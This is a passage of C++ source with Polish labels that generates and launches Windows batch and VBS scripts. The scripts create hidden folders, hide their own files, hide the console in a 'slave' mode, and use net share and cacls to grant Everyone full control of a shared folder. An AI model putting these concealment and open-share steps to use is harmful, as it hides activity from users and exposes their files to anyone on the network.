        SOF << "@echo off" << endl;
        SOF << "Title Folder" << endl;
        SOF << "md "<< folder << endl;
        SOF << "attrib +h "<< folder << endl;
        SOF << "exit" << endl;

        SOF.clear();
        SOF.close();
    }

    system("attrib +h SOF.bat"); //to trzeba dopracowac

    system("if exist SSSOF.bat del SSSOF.bat /a");

    fstream SSSOF;

    SSSOF.open("SSSOF.bat",ios::out);

    if(SSSOF.good()==false)
    {
        SSSOF.clear();
        SSSOF.close();

        cout << wersja << "Nie mozna utworzyc pliku SSSOF.bat!" << endl;
        Sleep(2000);
    }
    else
    {

        SSSOF << "@echo off" << endl;
        SSSOF << "Title SSSOF" << endl;
        SSSOF << ":powtorz" << endl;
        SSSOF << "if exist SOF.bat goto istnieje" << endl;
        SSSOF << "goto powtorz" << endl;
        SSSOF << ":istnieje" << endl;
        SSSOF << "start SOF.vbs" << endl;
        SSSOF << ":folder_start" << endl;
        SSSOF << "if exist "<< folder <<" goto otworz" << endl;
        SSSOF << "goto folder_start" << endl;
        SSSOF << ":otworz" << endl;
        SSSOF << "start "<< folder << endl;
        SSSOF << "exit" << endl;

        SSSOF.clear();
        SSSOF.close();
    }
    system("attrib +h SSSOF.bat");
    system("start sssof.vbs");

    Sprawdzacz_Dyskow_Twardych();
}

void DKU() //DOMYSLNY KATALOG URZYTKOWNIKA
{
    string odp_b;
    string dysk;
    int koniec=0;

    while(koniec==0)
    {
        system("cls");

        cout << "=======================================" << endl;
        cout << "Czy wygenerowac skrypt DKA t/n" << endl;
        cout << "=======================================" << endl;
        cin >> odp_b;

        if(odp_b=="t")
        {
            system("cls");
            cout << "=======================================" << endl;
            cout << "Nie ma problema - Skrypt dziala tylko w" << endl;
            cout << "jezykiem Polskim" << endl;
            cout << "=======================================" << endl;
            cout << "Podaj litere dysku systemowego:";
            cin >> dysk;

            fstream Plik;

            /*
            Plik.open("DS.txt",ios::in);

            if(Plik.good()==false)
            {
                Plik.clear();
                Plik.close();

                cout << "Nie mozna utworzyc pliku DS.txt" << endl;
            }
            else
            {
                getline(Plik,dysk);

                Plik.clear();
                Plik.close();
            }
            */

            system("if not exist Kochana mkdir Kochana");

            Plik.open("DKU.bat",ios::out);

            if(Plik.good()==false)
            {
                Plik.clear();
                Plik.close();

                cout << "Nie mozna otworzyc pliku DKU.bat" << endl;
            }
            else
            {
                Plik << "@echo off" << endl;
                Plik << "Title DKU" << endl;
                Plik << "color c" << endl;
                Plik << "echo ===================================================" << endl;
                Plik << "echo Ten plik nalezy uruchomic z prawami administratora!" << endl;
                Plik << "echo ===================================================" << endl;
                Plik << "pause" << endl;
                Plik << "color a" << endl;
                Plik << "if exist Kochana goto k_ist" << endl;
                Plik << "echo Nie znaleziono katalogu Kochana" << endl;
                Plik << "color c" << endl;
                Plik << "pause" << endl;
                Plik << "exit" << endl;
                Plik << ":k_ist" << endl;
                Plik << "net share Kochana="<<dysk<<":"<<w_slesz<<"Microsoft"<<w_slesz<<"Kochana "<<s_slesz<<"GRANT:Wszyscy,FULL"<< endl;
                Plik << "cacls "<<dysk<<":"<<w_slesz<<"Microsoft"<<w_slesz<<"Kochana "<<s_slesz<<"G wszyscy:F" << endl;
                Plik << "pause" << endl;
                Plik << "exit" << endl;
                //C:\Users\Kochana\Desktop\DOA>net share TAK=c:\users\kochana\desktop\DOA\testowy /GRANT:Wszyscy,FULL

                Plik.clear();
                Plik.close();
            }

            /*
            Plik.open("Admin.bat",ios::out);

            string user;

            cout << "Podaj nazwe swojego urzytkownika: ";
            cin >> user;

            if(Plik.good()==false)
            {

                Plik.clear();
                Plik.close();

                cout << "Nie mozna utworzyc pliku Admin.bat" << endl;
            }
            else
            {

                Plik << "@echo off" << endl;
                Plik << "Title Admin" << endl;
                Plik << "runas "<<s_slesz<<"user:"<<user<<" Admin.bat" << endl;

                Plik.clear();
                Plik.close();
            }

            Sleep(1000);

            //system("start Admin.bat");
            */
            exit(0);
        }
        else if(odp_b=="n")
        {
            koniec=1;
        }
        else
        {
            cout << "Nie rouzmiem tego znaku..." << endl;
            Sleep(2000);
        }
    }

}

void Otworz_Folder()
{
    fstream BOSS;

    BOSS.open("BOSS.txt",ios::in);

    if(BOSS.good()==false)
    {

        BOSS.clear();
        BOSS.close();

        Uniewidzialniacze_Skryptow();
        Skrypt_Otwarcia_Folderu();
    }
    else
    {

        BOSS.clear();
        BOSS.close();

        fstream MAKAO;

        MAKAO.open("MAKAO.txt",ios::in);

        if(MAKAO.good()==false)
        {

            MAKAO.clear();
            MAKAO.close();

            cout << "Niewolnik" << endl;

            HWND okno = FindWindowA( "ConsoleWindowClass", NULL );
            ShowWindow( okno, SW_HIDE );

            Slave_Aktywacja();
        }
        else
        {
            MAKAO.clear();
            MAKAO.close();

            DKU();
            Master_VBS();
            Szefi();
        }

        Sleep(2000);
    }
}

int main(void)
{
    /*
    HWND console = GetConsoleWindow();
    RECT r;
    GetWindowRect(console, &r);

    MoveWindow(console, r.left, r.top, 0, 0, TRUE);
    */

    //HWND okno = FindWindowA( "ConsoleWindowClass", NULL );
    //ShowWindow( okno, SW_HIDE );

    Otworz_Folder();

    return 0;
}
